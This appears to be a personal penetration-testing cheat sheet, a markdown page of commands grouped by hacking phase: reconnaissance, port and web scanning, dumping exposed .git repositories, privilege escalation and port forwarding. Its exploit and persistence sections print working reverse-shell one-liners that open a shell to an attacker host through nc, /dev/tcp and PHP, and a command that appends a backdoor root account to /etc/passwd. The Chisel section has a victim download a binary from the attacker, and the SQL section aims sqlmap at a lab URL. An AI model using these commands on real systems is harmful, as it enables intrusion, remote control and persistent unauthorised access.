---
layout: default
---
# Commands by Hacking phases


## Recognition

{% highlight bash %}
host [DOMAIN] # get IPv4 IPv6

whois [DOMAIN] # allows you to retrieve information about the dns servers used (available ip server, owner name, address)

dig [nomDomaine] # retrieve DNS addresses. Other information can be retrieved with the -h

dnsenum [nomDomaine] # retrieve DNS records and Nx server

tcptraceroute [nomDomaine]

theharvester -d [nomDomaine] # recovery of emails, host names

{% endhighlight %}

___
## Scanning

### Machine enumeration

{% highlight bash %}
fping/ping # check the presence of a machine on the network
fping -g [réseau local] # gives all the local network addresses that are reachable
{% endhighlight %}

**nmap**: open source port scanner (graphical -> zenmap)
{% highlight bash %}
nmap -sV -p- [ip] # scan network or a machine
 -sV # service version detection
 -O  # operating system detection
 -v  # verbose or -vv
 -A  # agressives scan (OS, script, traceroute) open ports, services, version --> when you don't care how 'loud' you are

 -Pn # if I don't want to ping the host

 --script vuln # if I want to run all scripts out of the vulnerability category
# all categories: https://nmap.org/book/nse-usage.html

# Timing template. (increase the speed your scan runs at) - /!\ higher speeds are noisier, and can incur errors!
 -T5

#### Ping sweep ####
-sn [networkIp]/[CIDR] # to obtain a map of the network structure.

#### SAVE THE OUTPUT ####
 -oA # three major formats
 -oN # normal format
 -oG # Grepable format
 -oX # output in xml format

xsltproc filename.xml -o filename.html # You can open an easy-to-read summary in the browser.
{% endhighlight %}


{% highlight bash %}
rustscan -a [ip] -- [nmap_arguments]
{% endhighlight %}
<br>


{% highlight bash %}
nessus # reports potential weaknesses on the tested machines (to be downloaded from tenable)
/etc/init.d/nessusd start # start nessus
http://localhost:8834 # access to nessus + register on tenable for an activation code
{% endhighlight %}


### Website Scanner

{% highlight bash %}
nikto -h [url]
wapiti
{% endhighlight %}

{% highlight bash %}
gobuster vhost -w [subdomains_list] -u [url] # look for subdomains
feroxbuster -w [wordlist_path] -x php,html,txt -u [url] # look for hidden files or directories
dirbuster
wfuzz -z file,[wordlist_path] -d "[param]=FUZZ&[param]=FUZZ" --hc 302 [url] # Fuzz parameters
{% endhighlight %}

#### URL/.git/

{% highlight bash %}
wget --mirror -I .git [url]/.git/
git checkout -- # if some files have been deleted, get them back
git log
git checkout [LOG-ID] # go back to a previous commit

git log --all --full-history
git show [COMMIT-ID]
git log --stat
{% endhighlight %}

Some automated scripts to investigate deeply.
+ **[script export.sh](gists/index.md#exportGitHistory.sh)**: Use this script to get all the history of a given file.
+ **[git-dumper](https://github.com/arthaud/git-dumper)**: tool to dump a git repository from a website.
+ **[git-tools](https://github.com/internetwache/GitTools)**: A repository with 3 tools for pwn'ing websites with .git repositories available.
+ **[githacker](https://github.com/captain-noob/GitHacker)**: A Git source leak exploit tool that restores the entire Git repository, including data from stash, for white-box auditing and analysis of developers' mind.

___
## Exploit (Gaining Access)

### Reverse Shell

#### Shell upgrading

{% highlight bash %}
/usr/bin/script -qc /bin/bash /dev/null # works almost all the time

python3 -c 'import pty;pty.spawn("/bin/bash")' # only if python is installed
{% endhighlight %}

#### Shell Stabilization
{% highlight bash %}
export TERM=xterm # this will give us access to term commands such as clear
Ctrl + Z # background the shell
stty raw -echo; fg # This does two things: 1. it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
{% endhighlight %}

#### Write multiple lines in a file with `echo`

{% highlight bash %}
echo "line 1
line 2" >> file.txt
{% endhighlight %}

#### BASH reverse shell one line
{% highlight bash %}
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip] 4444 >/tmp/f

bash -c "bash -i >& /dev/tcp/[ip]/4444 0>&1" # possibility not to use 'bash -c' at the beginning

nc [IP] [PORT]

php -r '$sock=fsockopen("[IP]",[port]);exec("/bin/sh -i <&3 >&3 2>&3");'
{% endhighlight %}

___
## Persistence (Maintaining Access) - Privilege Escalation

{% highlight bash %}
echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd # to create another root user
{% endhighlight %}


### Linux Privilege Escalation

{% highlight bash %}
sudo -l # checks current privileges

netstat -ltupn # listening ports
ss -tulw # listening ports

cat /etc/crontab # checks cronjob
{% endhighlight %}

#### FIND

{% highlight bash %}
find / -iname "*config*.php" 2>/dev/null # looking for config files - cat [filename] | grep -i "db_"
find / -user root -perm -u=s 2>/dev/null # Find all files/dirs that are owned by root and have at least the SUID permission

find / -group [name] 2>/dev/null # Find all files/dirs owned by a group
find / -user [username] 2>/dev/null # Find all files/dirs owned by a user

-perm 444 # exactly readable by everyone
-perm /444 # only readable by everyone

-exec [command] [option] {}\; 2>/dev/null # {} corresponds to the files returned by the find command
{% endhighlight %}

#### Capabilities

{% highlight bash %}
getcap -r / 2>/dev/null # scan the system for capabilities.
{% endhighlight %}

#### GREP

{% highlight bash %}
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" # grep ip addresses from your output.
{% endhighlight %}

### Port forwarding

**[Using Chisel](https://github.com/jpillora/chisel)**
{% highlight bash %}
# on the attacker
cd /path/where/chisel/is # binary file
updog # or whatever cmdline to setup an http server

# on the victim
wget IP:PORT/chisel
chmod +x chisel # set it executable

# on the attacker
chisel server --reverse --port 9002 # port forwarding

# on the victim
./chisel client YOUR_IP:9002 R:9001:[redirectedIP]:[redirectedPort]

# Now you have access on the attacker's machine to : localhost:9001
{% endhighlight %}

**Using SSH**
{% highlight bash %}
ssh -N user@[IP_distant] -L [@_redirection_machine]:[port_redirection]:[IP_redirigee]:[port_redirige]
{% endhighlight %}

Example:
{% highlight bash %}
ssh -N user@10.10.10.10 -L 172.17.0.1:4441:192.168.0.100:80
{% endhighlight %}
On the `10.10.10.10` machine, `user` is running a web server on its `192.168.0.100:80` interface. Here, I'm redirecting to my `172.17.0.1` address (the one on the same network as my docker container) and port 4441. So from my browser, http://172.17.0.1:4441 is reachable. By specifying a proxy on `172.17.0.2:4440`, I can modify the requests on Burpsuite if needed.


#### Automated scripts for linux privesc

**[LSE - linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)**
{% highlight bash %}
wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;chmod 700 lse.sh

curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -Lo lse.sh;chmod 700 lse.sh
{% endhighlight %}

**[LES - linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)**
{% highlight bash %}
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh;chmod 700 les.sh
{% endhighlight %}

**[LinPEAS - Linux Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)**
{% highlight bash %}
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -Lo lPEAS.sh;chmod 700 lPEAS.sh
{% endhighlight %}

___
## Clearing Track

TODO

___
# Other useful commands

## HTTP ServerOne line

{% highlight bash %}
python -m SimpleHTTPServer 8000 # Python 2.x

python -m http.server 8000 # Python 3.x

updog # allows uploads
{% endhighlight %}

## Steganography

Find images information

{% highlight bash %}
identify -verbose
pngcheck [image]
zsteg [image] # detects stegano data hidden in PNG & BMP


steghide extract -sf [filename]
stegseek [file] [wordlist] # bruteforce steghide passphrase
{% endhighlight %}


## Web

### Attaque SQL

{% highlight bash %}
sqlmap -u "http://172.16.128.39:8080/student_grade/index.php?student_id=" --tables -D Dysto_School -T student
{% endhighlight %}

### Website request command line
{% highlight bash %}
curl -v [url]
curl -v -X POST [url]
wget [url]
{% endhighlight %}

___
## Forensic Investigation
{% highlight bash %}
volatility
testdisk
{% endhighlight %}

### Hidden files extraction
{% highlight bash %}
binwalk -e
{% endhighlight %}
